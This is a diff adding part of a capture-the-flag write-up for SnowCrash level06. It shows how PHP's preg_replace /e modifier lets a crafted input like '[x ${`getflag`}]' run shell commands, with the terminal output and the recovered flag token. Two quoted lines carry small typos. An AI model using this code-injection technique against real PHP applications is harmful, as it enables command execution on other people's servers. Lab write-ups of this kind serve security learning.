@@ -34,3 +34,28 @@ There is a well known [exploit](https://captainnoob.medium.com/command-execution
 This breach allows to evaluate a part of the string given as parameter so our string will be considered as a php string.
 
 In PHP, we can use the output of a function in a string by using some brackets:
+
+```php
+{${shell_exec(get_flag)}}
+```
+
+The difficulty is to make the string match the `regex` in the preg_replace call:
+
+```php
+reg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
+```
+
+regex -> `(\[x (.*)\])`. To match the regex, the string must start by `[x` and end with `]`:
+
+```php
+[x ${`get_flag`)}]
+```
+
+```bash
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/flag06
+level06@SnowCrash:~$ ./level06 /tmp/flag06
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+```
+
+So the flag is: `wiok45aaoguiboiki2tuin6ub`
